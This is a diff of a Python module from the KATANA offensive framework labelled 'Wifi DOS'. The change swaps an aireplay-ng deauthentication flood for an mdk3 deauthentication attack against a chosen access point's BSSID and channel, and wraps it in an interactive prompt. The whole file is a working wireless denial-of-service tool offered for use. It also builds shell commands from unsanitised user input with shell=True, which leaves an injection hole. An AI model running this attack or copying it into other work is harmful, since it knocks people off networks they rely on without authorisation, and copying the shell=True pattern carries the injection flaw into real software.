@@ -1,85 +1,112 @@
-# KATANA
-# Wifi DDOS
-# Script by RedToor
-# 11/06/2015
-
-from core import help
-import subprocess
-import commands
-W  = '\033[0m'  
-R  = '\033[31m' 
-G  = '\033[32m' 
-O  = '\033[33m' 
-B  = '\033[34m' 
-P  = '\033[35m' 
-C  = '\033[36m' 
-GR = '\033[37m'
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+# @KATANA                    #
+# Modules   : Wifi DOS       #
+# Script by : RedToor        #
+# Date      : 11/06/2015     #
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+# Katana Core                #
+from core.design import *    #
+from core import help        #
+from core import ping        #
+d=DESIGN()                   #
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+# Libraries                  #
+import subprocess            #
+import commands              #
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+# Default                    #
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
 defaultcar="wlan0"
-defaultint="mon0"
+defaultint="mon1"
 defaultmac="68:94:23:6E:48:5B"
-defaultcha="10"
-def ddos():
-	global defaultint,defaultmac,defaultcha,defaultcar
-	actions = raw_input(O+"     ktn/wifi/ddos > "+W)
-	if actions == "show options":
-		print ""
-		print "     ["+R+"+"+W+"] options"
-		print "     |Mac Target      : yes"
-		print "     |Channel         : yes"
-		print "     |Interface       : yes/no"
-		print "     |Monitor         : yes\n"
-		print ""
-		print "     ["+G+"+"+W+"] options current"
-		print "     |mac             : ",defaultmac
-		print "     |channel         : ",defaultcha
-		print "     |interface       : ",defaultcar
-		print "     |monitor         : ",defaultint
-		print "\n"
-		print "     ["+G+"+"+W+"] Auxiliar help"
-		Interfaces=commands.getoutput("airmon-ng | grep 'wlan' | awk '{print $1}'")
-		Monitor=commands.getoutput("airmon-ng | grep 'mon' | awk '{print $1}'")
-		Interfaces=Interfaces.replace("\n",",")
-		Monitor=Monitor.replace("\n",",")
-		print "     |Interfaces      : ",Interfaces
-		print "     |Monitor         : ",Monitor
-		print ""
-	elif actions=="back":
-		pass 
-	elif actions=="exit":
-		print C+"     GooD"+W+" bye."
-		exit()
-	elif actions[0:7] == "set mac":
-			defaultmac = actions[8:]
-			print "     Mac Target   : "+defaultmac+" "+O+"     Saved!!!"+W
-			ddos()
-	elif actions[0:11] == "set channel":
-			defaultcha = actions[12:]
-			print "     Channel      : "+defaultcha+" "+O+"     Saved!!!"+W
-			ddos()
-	elif actions[0:13] == "set interface":
-			defaultcar = actions[14:]
-			print "     Interface    : "+defaultcar+" "+O+"     Saved!!!"+W
-			ddos()
-	elif actions[0:11] == "set monitor":
-			defaultint = actions[12:]
-			print "     Monitor      : "+defaultint+" "+O+"     Saved!!!"+W
-			ddos()
-	elif actions == "run":
-		try:
-			print "     ["+G+"+"+W+"] options current"
-			print "     |mac             : ",defaultmac
-			print "     |channel         : ",defaultcha
-			print "     |interface       : ",defaultcar
-			print "     |monitor         : ",defaultint
+defaultcha="9"
+defaultess="LILI__WIFI"
+# :-:-:-:-:-:-:-:-:-:-:-:-:- #
+
+def run(para,parb,parc,pard,pare):
+	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
+	defaultcar=para
+	defaultint=parb
+	defaultmac=parc
+	defaultcha=pard
+	defaultess=pare
+	ddos(1)
+
+
+def ddos(run):
+	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
+	try:
+		if run!=1:
+			actions=raw_input(d.prompt("wifi/dos"))
+		else:
+			actions="run"
+		if actions == "show options" or actions == "sop":
+			d.option()
+			d.descrip("intf","yes","Interface card",defaultcar)
+			d.descrip("intm","yes","Int... monitor",defaultint)
+			d.descrip("bssid","yes","Mac address",defaultmac)
+			d.descrip("essid","yes","Name of AP",defaultess)
+			d.descrip("chan","yes","Channel red",defaultcha)
 			print ""
-			print("     ["+G+"+"+W+"] Starting DDOS to "+defaultmac)
+			print " "+Hlp+" Auxiliar help\n"
+			Interfaces=commands.getoutput("airmon-ng | grep 'wlan' | awk '{print $1}'")
+			Monitor=commands.getoutput("airmon-ng | grep 'mon' | awk '{print $1}'")
+			Interfaces=Interfaces.replace("\n",",")
+			Monitor=Monitor.replace("\n",",")
+			if Interfaces=="":
+				Interfaces="No network cards was found."
+			if Monitor=="":
+				Monitor="No monitor mode enabled, use 'start {Interface}' right here."
+			print " Interfaces      : ",Interfaces
+			print " Int... Monitor  : ",Monitor
+			print ""
+			if Monitor!="No monitor mode enabled, use 'start {Interface}' right here.":
+				ping.scanwifi()
+				print ""
+			ddos(0)
+		elif actions[0:8] == "set intf":
+			defaultcar = actions[9:]
+			d.change("intf",defaultcar)
+			ddos(0)
+		elif actions[0:8] == "set intm":
+			defaultint = actions[9:]
+			d.change("intf",defaultint)
+			ddos(0)
+		elif actions[0:9] == "set bssid":
+			defaultmac = actions[10:]
+			d.change("bssid",defaultmac)
+			ddos(0)
+		elif actions[0:9] == "set essid":
+			defaultess = actions[10:]
+			d.change("essid",defaultess)
+			ddos(0)
+		elif actions[0:8] == "set chan":
+			defaultcha = actions[9:]
+			d.change("chan",defaultcha)
+			ddos(0)
+		elif actions[0:5] == "start":
+			start = actions[6:]
+			subprocess.call('airmon-ng start '+start, shell=True)
+			ddos(0)
+		elif actions=="exit" or actions=="x":
+			d.goodbye()
+			exit()
+		elif actions=="help" or actions=="h":
+			help.help()
+		elif actions=="back" or actions=="b":
+			return
+		elif actions=="run"  or actions=="r":
+			d.run()
 			try:
-				print("     ["+O+"!"+W+"] Press (Ctrl + C) for Stop DDOS")
-				subprocess.call('aireplay-ng --deauth 99999999999 -o '+defaultcha+' -a '+defaultmac+' '+defaultint+'', shell=True)
+				print " "+Alr+" Setting files..."
+				subprocess.call('echo '+defaultmac+' > tmp/MACAP.ls',shell=True)
+				print " "+Alr+" Starting attack..."
+				subprocess.call('mdk3 '+defaultint+' d -b tmp/MACAP.ls -c '+defaultcha, shell=True)
 			except(KeyboardInterrupt, SystemExit):
-				print("\n     ["+O+"!"+W+"] Stoped DDOS")
-		except(KeyboardInterrupt, SystemExit):
-			print("\n     ["+O+"!"+W+"] (Ctrl + C) Detected, System Exit")
-	else:
-		print "     ["+O+"!"+W+"] command No Accept"+W
-	ddos()
+				print("\n    Stopped DDOS")
+		else:
+			d.nocommand()
+	except:
+		d.kbi()
+		exit()
+	ddos(0)
